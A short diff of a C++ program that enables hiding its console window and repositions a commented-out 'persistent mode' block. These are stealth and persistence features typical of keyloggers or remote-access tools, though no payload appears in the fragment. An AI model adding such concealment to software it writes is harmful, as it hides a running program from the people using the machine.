@@ -7,11 +7,11 @@
 using namespace std;
 
 int main(void){
-// --------------------------------------------------------------------------------------------
-/* Uncomment to enable persistent mode
-
     // Hide windows console
-    //ShowWindow(GetConsoleWindow(),SW_HIDE);
+    ShowWindow(GetConsoleWindow(),SW_HIDE);
+// --------------------------------------------------------------------------------------------
+/* Uncomment to enable persistent mod
+   
     //Get current location
     char* cwd = _getcwd( 0, 0 );
     string directory (cwd);
